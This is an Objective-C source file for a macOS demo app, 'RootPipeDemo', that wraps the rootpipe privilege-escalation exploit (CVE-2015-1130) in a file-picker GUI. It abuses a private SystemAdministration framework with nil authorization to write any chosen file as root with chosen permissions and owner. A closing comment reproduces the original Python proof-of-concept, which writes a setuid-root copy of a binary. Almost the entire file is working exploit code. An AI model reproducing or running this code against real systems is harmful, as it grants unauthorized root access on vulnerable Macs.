//
//  AppDelegate.m
//  RootPipeDemo
//
//  Created by Kramer on 4/10/15.
//  Copyright (c) 2015 Shmoopi LLC. All rights reserved.
//

#import "AppDelegate.h"
#import <objc/runtime.h>
#include <dlfcn.h>

@interface AppDelegate ()

// SetRootPrivileges
- (BOOL)setRootPrivilegesToFileAtPath:(NSURL *)original toPath:(NSURL *)new withPermissions:(NSNumber *)permissions withOwnerName:(NSString *)owner andGroupName:(NSString *)group;

@property (weak) IBOutlet NSWindow *window;
@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    // Insert code here to initialize your application
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
    // Insert code here to tear down your application
}

// Give a file root privileges and copy to path
- (BOOL)setRootPrivilegesToFileAtPath:(NSURL *)original toPath:(NSURL *)new withPermissions:(NSNumber *)permissions withOwnerName:(NSString *)owner andGroupName:(NSString *)group {
    
    // Check that the original file exists
    if (!original || original == nil || ![[NSFileManager defaultManager] fileExistsAtPath:[original path]]) {
        NSLog(@"Failed to find the original file...");
        return NO;
    }
    
    // Open the system admin framework
    dlopen([@"/System/Library/PrivateFrameworks/SystemAdministration.framework/SystemAdministration" fileSystemRepresentation], RTLD_LOCAL);
    
    // Get the write config client
    Class WriteConfigClient = objc_lookUpClass("WriteConfigClient");

    // Validate the client
    if (WriteConfigClient != nil) {
        
        // Check if we can get the singleton
        if ([WriteConfigClient respondsToSelector:NSSelectorFromString(@"sharedClient")]) {
            
            // Get the sharedClient singleton
            id sharedClient = [WriteConfigClient performSelector:NSSelectorFromString(@"sharedClient")];
            
            // Validate the shared client
            if (sharedClient != nil) {
                
                // Authenticate without privileges
                [sharedClient performSelector:NSSelectorFromString(@"authenticateUsingAuthorizationSync:") withObject:nil];
                
                // Set the remote proxy
                id remoteProxy = [sharedClient performSelector:NSSelectorFromString(@"remoteProxy")];
                
                // Set the xattribute
                NSMutableDictionary *attr = [NSMutableDictionary new];
                
                /* chmod */
                // Set the priviledges and the posix permissions for the file
                [attr setValue:[NSNumber numberWithShort:[permissions shortValue]] forKey:NSFilePosixPermissions];
                
                /* chown */
                // Set the user account name for the file
                [attr setValue:owner forKey:NSFileOwnerAccountName];
                // Set the group account name for the file
                [attr setValue:group forKey:NSFileGroupOwnerAccountName];
                
                // Get the file
                NSData *file = [[NSData alloc] initWithContentsOfFile:[original path]];
                
                // Set the selector for the method we want to utilize
                SEL mySelector = NSSelectorFromString(@"createFileWithContents:path:attributes:");
                
                // Create the invokation
                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:[remoteProxy methodSignatureForSelector:mySelector]];
                
                // Set the selector - function we want to call
                [inv setSelector:mySelector];
                // Set the target from which to run the function -
                [inv setTarget:remoteProxy];
                
                // Set the file to copy
                [inv setArgument:&file atIndex:2];
                
                // Create the path
                NSString *targetFile = [new path];
                
                // Set the path of the new object
                [inv setArgument:&targetFile atIndex:3];
                
                // Set the attributes
                [inv setArgument:&attr atIndex:4];
                
                // Invoke it
                [inv invoke];
                
                // Return YES
                return YES;
            }
        }
        
    }
    
    return NO;
}

- (IBAction)browseToFileInput:(id)sender {
    // Create the open dialog
    NSOpenPanel *openDlg = [NSOpenPanel openPanel];
    [openDlg setPrompt:@"Select"];
    [openDlg setAllowsMultipleSelection:NO];
    [openDlg setCanChooseFiles:YES];
    [openDlg setCanChooseDirectories:NO];
    [openDlg setDirectoryURL:[NSURL URLWithString:@"~/Desktop/"]];
    // Block to handle the completion
    [openDlg beginSheetModalForWindow:self.window completionHandler:^(NSInteger result) {
        if (result == NSOKButton) {
            // Get the selected file
            NSURL *file = [openDlg URL];
            [self.pathToFile setStringValue:file.path];
        }
    }];
}

- (IBAction)browseToFileOutput:(id)sender {
    // Create the save panel
    NSSavePanel *panel = [NSSavePanel savePanel];
    [panel setNameFieldStringValue:@"file"];
    [panel beginWithCompletionHandler:^(NSInteger result) {
        if (result == NSFileHandlingPanelOKButton) {
            NSString *savePath = [[panel URL] path];
            [self.pathToOutput setStringValue:savePath];
        }
    }];
}

- (IBAction)createFile:(id)sender {
    // Validate the paths
    if (!self.pathToFile.stringValue || self.pathToFile.stringValue.length < 1) {
        // Invalid path to file
        NSAlert *alert = [[NSAlert alloc] init];
        [alert addButtonWithTitle:@"OK"];
        [alert setMessageText:@"Failed to create file"];
        [alert setInformativeText:@"Invalid path to input file..."];
        [alert setAlertStyle:NSCriticalAlertStyle];
        [alert beginSheetModalForWindow:[self window] modalDelegate:self didEndSelector:nil contextInfo:nil];
    }
    if (!self.pathToOutput.stringValue || self.pathToOutput.stringValue.length < 1) {
        // Invalid path to output
        NSAlert *alert = [[NSAlert alloc] init];
        [alert addButtonWithTitle:@"OK"];
        [alert setMessageText:@"Failed to create file"];
        [alert setInformativeText:@"Invalid path to output file..."];
        [alert setAlertStyle:NSCriticalAlertStyle];
        [alert beginSheetModalForWindow:[self window] modalDelegate:self didEndSelector:nil contextInfo:nil];
        
    }
    if (!self.filePermissions.stringValue || self.filePermissions.stringValue.length < 1) {
        // Invalid file permissions
        NSAlert *alert = [[NSAlert alloc] init];
        [alert addButtonWithTitle:@"OK"];
        [alert setMessageText:@"Failed to create file"];
        [alert setInformativeText:@"Invalid file permissions..."];
        [alert setAlertStyle:NSCriticalAlertStyle];
        [alert beginSheetModalForWindow:[self window] modalDelegate:self didEndSelector:nil contextInfo:nil];
    }
    if (!self.fileOwner.stringValue || self.fileOwner.stringValue.length < 1) {
        // No file owner set - defaults to root
        NSLog(@"No file owner set, defaults to root");
    }
    if (!self.fileGroup.stringValue || self.fileGroup.stringValue.length < 1) {
        // No file group set - defaults to staff
        NSLog(@"No file group set, defaults to staff");
    }
    
    // Run the Root Privileges check and verify
    if (![self setRootPrivilegesToFileAtPath:[NSURL fileURLWithPath:self.pathToFile.stringValue] toPath:[NSURL fileURLWithPath:self.pathToOutput.stringValue] withPermissions:[NSNumber numberWithShort:self.filePermissions.integerValue] withOwnerName:self.fileOwner.stringValue andGroupName:self.fileGroup.stringValue]) {
        NSAlert *alert = [[NSAlert alloc] init];
        [alert addButtonWithTitle:@"OK"];
        [alert setMessageText:@"Failed to create file"];
        [alert setInformativeText:@"Unknown error occured"];
        [alert setAlertStyle:NSCriticalAlertStyle];
        [alert beginSheetModalForWindow:[self window] modalDelegate:self didEndSelector:nil contextInfo:nil];
    }
}


@end

/*
 ########################################################
 #
 #  PoC exploit code for rootpipe (CVE-2015-1130)
 #
 #  Created by Emil Kvarnhammar, TrueSec
 #
 #  Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2
 #
 ########################################################
 import os
 import sys
 import platform
 import re
 import ctypes
 import objc
 import sys
 from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
 from Foundation import NSAutoreleasePool
 
 def load_lib(append_path):
 return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);
 
 def use_old_api():
 return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])
 
 
 args = sys.argv
 
 if len(args) != 3:
 print "usage: exploit.py source_binary dest_binary_as_root"
 sys.exit(-1)
 
 source_binary = args[1]
 dest_binary = os.path.realpath(args[2])
 
 if not os.path.exists(source_binary):
 raise Exception("file does not exist!")
 
 pool = NSAutoreleasePool.alloc().init()
 
 attr = NSMutableDictionary.alloc().init()
 attr.setValue_forKey_(04777, NSFilePosixPermissions)
 data = NSData.alloc().initWithContentsOfFile_(source_binary)
 
 print "will write file", dest_binary
 
 if use_old_api():
 adm_lib = load_lib("/Admin.framework/Admin")
 Authenticator = objc.lookUpClass("Authenticator")
 ToolLiaison = objc.lookUpClass("ToolLiaison")
 SFAuthorization = objc.lookUpClass("SFAuthorization")
 
 authent = Authenticator.sharedAuthenticator()
 authref = SFAuthorization.authorization()
 
 # authref with value nil is not accepted on OS X <= 10.8
 authent.authenticateUsingAuthorizationSync_(authref)
 st = ToolLiaison.sharedToolLiaison()
 tool = st.tool()
 tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
 else:
 adm_lib = load_lib("/SystemAdministration.framework/SystemAdministration")
 WriteConfigClient = objc.lookUpClass("WriteConfigClient")
 client = WriteConfigClient.sharedClient()
 client.authenticateUsingAuthorizationSync_(None)
 tool = client.remoteProxy()
 
 tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)
 
 
 print "Done!"
 
 del pool
*/